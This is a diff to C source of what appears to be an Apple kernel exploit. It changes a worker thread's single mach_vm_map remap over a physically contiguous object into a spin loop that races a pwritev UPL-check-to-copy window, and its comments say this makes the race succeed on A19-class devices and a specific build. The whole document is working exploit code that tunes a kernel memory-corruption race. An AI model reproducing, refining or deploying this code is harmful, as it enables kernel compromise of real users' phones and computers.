@@ -61,10 +61,25 @@ void* cs2_free_worker(void* arg) {
         //                        OF REAL M1 PAGE 2
         //                        DUE TO BUG
 
-        // here we're mapping OVER the physically contiguous object (VM_FLAGS_FIXED), overwritting with the mapping's current offset
-        // which is not guaranteed to be physically contiguous (VM_FLAGS_OVERWRITE)
-        kern_return_t kr = mach_vm_map(mach_task_self(), &target_addr, free_target_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, target_object, target_object_offset, false, VM_PROT_DEFAULT,
-                                       VM_PROT_DEFAULT, VM_INHERIT_NONE);
+        // LightSword weld (2026-10-24, calib-proven on 24A435): on A19-class
+        // trains the kernel's UPL-check->copy window is too tight for a
+        // single-shot remap (100-try loops returned kr=5 all-pass). The calib
+        // race thread SPINS the same mach_vm_map through the whole pwritev
+        // window and that shape crosses. Mirror it here: re-map with freshly
+        // synced (object, offset) every iteration until the main thread drops
+        // race_sync. Capped spins keep kernel thrash bounded.
+        uint64_t spins = 0;
+        kern_return_t kr = KERN_SUCCESS;
+        while (atomic_load_explicit(&shared->race_sync, memory_order_seq_cst) == 1) {
+            target_object = (mach_port_t)atomic_load_explicit(&shared->target_object_sync, memory_order_seq_cst);
+            target_object_offset = atomic_load_explicit(&shared->target_object_offset_sync, memory_order_seq_cst);
+            mach_vm_address_t spin_addr = free_target;
+            kr = mach_vm_map(mach_task_self(), &spin_addr, free_target_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, target_object, target_object_offset, false, VM_PROT_DEFAULT,
+                             VM_PROT_DEFAULT, VM_INHERIT_NONE);
+            if (kr != KERN_SUCCESS) { break; }
+            if (++spins >= 64) break;
+        }
+        while (atomic_load_explicit(&shared->race_sync, memory_order_seq_cst) == 1);
         if (kr != KERN_SUCCESS) {
             // LOG_DEBUG("free_thread: target_object_offset: %#llx, free_target_size: %#llx", target_object_offset, free_target_size);
             LOG_ERR("free_thread: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
